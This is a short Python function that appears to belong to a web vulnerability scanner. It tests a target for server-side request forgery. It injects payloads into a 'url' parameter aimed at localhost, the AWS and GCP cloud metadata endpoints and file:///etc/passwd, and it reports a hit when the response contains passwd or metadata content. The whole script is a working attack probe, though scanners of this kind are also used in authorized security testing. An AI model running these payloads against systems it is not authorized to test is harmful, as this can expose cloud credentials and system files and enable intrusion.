import requests
from colorama import Fore, Style, init

init(autoreset=True)

def ssrf_scan(target, verbose=False):
    print(Fore.CYAN + "[SSRF SCAN STARTED]")
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0'})

    payloads = [
        'http://127.0.0.1:80',
        'http://localhost:80',
        'http://169.254.169.254/latest/meta-data/',  # AWS
        'http://metadata.google.internal/computeMetadata/v1/',  # GCP
        'file:///etc/passwd'
    ]

    vuln_found = False

    for payload in payloads:
        try:
            url = f"{target.rstrip('/')}?url={payload}"
            response = session.get(url, timeout=5)
            if 'root:' in response.text or 'metadata' in response.text or 'passwd' in response.text:
                print(Fore.RED + f"[SSRF VULN] {url}")
                vuln_found = True
        except Exception as e:
            if verbose:
                print(Fore.YELLOW + f"[INFO] {url} - {e}")

    if not vuln_found:
        print(Fore.GREEN + "[SSRF] No vulnerabilities found")
    print(Fore.CYAN + "[SSRF SCAN COMPLETED]")